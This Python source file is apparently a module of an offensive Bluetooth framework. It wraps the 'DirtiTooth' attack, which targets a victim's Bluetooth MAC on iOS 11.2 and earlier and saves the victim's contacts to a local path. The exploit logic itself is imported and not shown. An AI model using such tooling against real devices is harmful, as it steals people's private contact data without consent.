from subprocess import Popen, PIPE
from os import system, kill, environ
from modules._module import Module
from utils.custom_print import print_ok, print_info, print_error
from utils.check_root import is_root
from utils.dirtytooth.dirtytooth import start_dirtytooth
from utildata.dataset_options import Option


class HomeModule(Module):

    def __init__(self):
        information = {"Name": "DirtiTooth",
                       "Description": "Takes advantage of the management of the profiles causing impact on the privacy of users who use Bluetooth technology daily. Run launchService before",
                       "Author": "@josueencinar",
                       "privileges": "root",
                       "Target": "iOS 11.2 and earlier"}

        # -----------name-----default_value--description--required?
        options = {"bmac": Option.create(name="bmac", required=True , description='Mac of the victim joined by the launchService module'),
                   "path": Option.create(name="path", value="/tmp/dirtytooth", required=True, description='Path to save contacts')
                   }

        # Constructor of the parent class
        super(HomeModule, self).__init__(information, options)

    # This function must be always implemented, it is called by the run option
    @is_root
    def run(self):
        print_info("Launching Service")
        res = start_dirtytooth(self.args["bmac"], self.args["path"])
        if res == 1:
            print_ok("Done")
        elif res == 0:
            print_error('Process dirtyagent doesn´t exist (use module launch-service first)')
        